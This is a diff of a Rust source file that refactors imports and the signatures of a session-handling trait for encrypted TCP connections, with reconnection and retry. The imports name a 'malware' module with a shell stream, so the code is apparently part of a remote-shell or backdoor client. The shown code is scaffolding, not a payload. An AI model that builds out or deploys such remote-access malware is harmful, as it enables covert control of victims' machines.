@@ -1,24 +1,29 @@
+use std::io;
 use std::io::Error;
 use std::net::{IpAddr, TcpStream, ToSocketAddrs};
 
 use crate::{
     Application::malware::utils::shell::ShellStream,
-    structure::utils::{
-        enums::{
-            EncryptType,
-            HandshakeType,
-            Packet,
-            ParseError,
+    structure::{
+        utils::{
+            enums::{
+                EncryptType,
+                HandshakeType,
+                Packet,
+                ParseError,
+            },
+            structs::{
+                define::StructStone,
+                define::EncryptionInfo
+            }
         },
-        structs::define::StructStone
-        ,
+        packet::{connection, secure_connection}
     },
     utility::secure::{
         crypto::Crypto,
         utils::{AesGcmSivCrypto, RsaCrypto},
     },
 };
-use crate::structure::utils::structs::define::EncryptionInfo;
 
 pub struct Session {
     pub(crate) encryption: EncryptionInfo,
@@ -114,9 +119,11 @@ pub trait PacketProcessing {
 }
 
 pub trait HandleSession {
-    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> std::io::Result<(TcpStream, Packet)>;
-    fn normal(address: IpAddr) -> Session;
-    fn secure(address: IpAddr, encryption: EncryptionInfo) -> Session;
+    fn new<A: ToSocketAddrs>(address: A, packet: Packet) -> Result<(TcpStream,Packet), (Error, Packet)>;
+    fn normal(address: IpAddr, packet: Packet) -> Session;
+    fn secure(address: IpAddr, packet: Packet) -> Session;
+    fn establish_connection(address: IpAddr, conn_type: EncryptionInfo, packet: Packet, attempts: u32) -> Session;
+    fn optional(address: IpAddr, encryption: EncryptionInfo) -> Session;
     fn is_connected(&self) -> bool;
     fn reconnection(&mut self) -> Result<Session, Error>;
     fn encryption(&mut self) -> Result<(), ParseError>;
